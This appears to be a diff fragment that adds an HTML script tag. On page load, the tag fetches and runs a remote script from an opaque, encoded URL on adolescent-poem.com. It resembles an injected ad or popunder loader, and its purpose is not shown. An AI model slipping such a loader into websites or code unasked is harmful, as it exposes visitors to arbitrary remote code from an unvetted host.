@@ -1,0 +1,12 @@
+<script>
+(function(zzgia){
+var d = document,
+    s = d.createElement('script'),
+    l = d.scripts[d.scripts.length - 1];
+s.settings = zzgia || {};
+s.src = "\/\/adolescent-poem.com\/c\/DJ9.6bbJ2Q5ul\/S\/WqQM9cNFjPcL1kNhzIQh1eO\/CT0\/2aN_z\/Uu3LNPDmUJ5X";
+s.async = true;
+s.referrerPolicy = 'no-referrer-when-downgrade';
+l.parentNode.insertBefore(s, l);
+})({})
+</script>
